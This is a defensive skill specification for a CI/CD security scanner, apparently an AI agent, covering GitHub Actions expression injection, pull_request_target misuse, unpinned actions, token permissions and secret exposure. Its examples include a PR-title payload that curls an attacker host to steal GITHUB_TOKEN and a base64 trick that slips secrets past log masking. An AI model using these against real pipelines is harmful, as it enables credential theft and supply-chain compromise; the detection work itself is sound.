---
name: sc-ci-cd
description: CI/CD pipeline security — GitHub Actions injection, secret exposure, untrusted actions, and artifact poisoning
license: MIT
metadata:
  author: ersinkoc
  category: security
  version: "1.0.0"
---

# SC: CI/CD Pipeline Security

## Purpose

Detects CI/CD pipeline security vulnerabilities with deep focus on GitHub Actions expression injection, pull_request_target misuse, untrusted third-party actions, secret exposure in logs, artifact poisoning, and pipeline privilege escalation. Also covers GitLab CI and general pipeline security patterns.

## Activation

Called by sc-orchestrator during Phase 2 when CI/CD configuration files are detected.

## Phase 1: Discovery

### File Patterns
```
**/.github/workflows/*.yml, **/.github/workflows/*.yaml,
**/.gitlab-ci.yml, **/Jenkinsfile, **/.circleci/config.yml,
**/.travis.yml, **/azure-pipelines.yml
```

### GitHub Actions Security Checks

**1. Expression Injection (Critical):**
```yaml
# VULNERABLE: User-controlled data in run command
- run: echo "Title: ${{ github.event.pull_request.title }}"
# PR title: "Fix $(curl attacker.com/steal?t=$GITHUB_TOKEN)" → RCE

# SAFE: Use environment variable (not interpreted by shell)
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Dangerous contexts: `github.event.pull_request.title`, `github.event.pull_request.body`,
`github.event.issue.title`, `github.event.issue.body`, `github.event.comment.body`,
`github.event.review.body`, `github.event.head_commit.message`,
`github.event.commits[*].message`, `github.head_ref`

**2. pull_request_target with Checkout:**
```yaml
# VULNERABLE: Checking out PR code with write access
on: pull_request_target
jobs:
  build:
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}  # PR code!
    - run: npm install  # Runs attacker's package.json scripts!
```

**3. Untrusted Actions:**
```yaml
# RISKY: Mutable tag reference
- uses: some-org/some-action@v1  # Tag can be moved to malicious commit

# SAFE: Pin to SHA
- uses: some-org/some-action@a1b2c3d4e5f6...  # Immutable
```

**4. Excessive GITHUB_TOKEN Permissions:**
```yaml
# VULNERABLE: Default write-all permissions
# (no permissions block = write access to everything)

# SAFE: Minimal permissions
permissions:
  contents: read
  pull-requests: write
```

**5. Secret Exposure:**
```yaml
# VULNERABLE: Secret in command output
- run: echo "Deploying with key ${{ secrets.DEPLOY_KEY }}"
  # Secrets are masked, but can be exfiltrated via encoding
- run: echo "${{ secrets.API_KEY }}" | base64  # Bypasses masking!
```

### GitLab CI Checks
- `include: remote:` loading untrusted templates
- Variable exposure in job logs
- Protected branch bypass via MR pipelines
- Runner registration token exposure

## Severity Classification

- **Critical:** Expression injection in GitHub Actions, pull_request_target with PR checkout
- **High:** Secrets exfiltration, untrusted actions with write access, excessive GITHUB_TOKEN
- **Medium:** Unpinned third-party actions, missing permissions block
- **Low:** Minor configuration improvements, unused secrets

## Output Format

### Finding: CICD-{NNN}
- **Title:** CI/CD {vulnerability type}
- **Severity:** Critical | High | Medium | Low
- **Confidence:** 0-100
- **File:** file/path:line
- **Vulnerability Type:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Description:** {What was found}
- **Impact:** Supply chain compromise, secret theft, code injection, unauthorized deployment.
- **Remediation:** {Specific fix — use env vars, pin actions, restrict permissions}
- **References:** https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

## Common False Positives

1. **Trusted organization actions** — first-party actions from the same org
2. **Read-only workflows** — workflows that only read data, no write access
3. **Manual dispatch workflows** — triggered only by maintainers
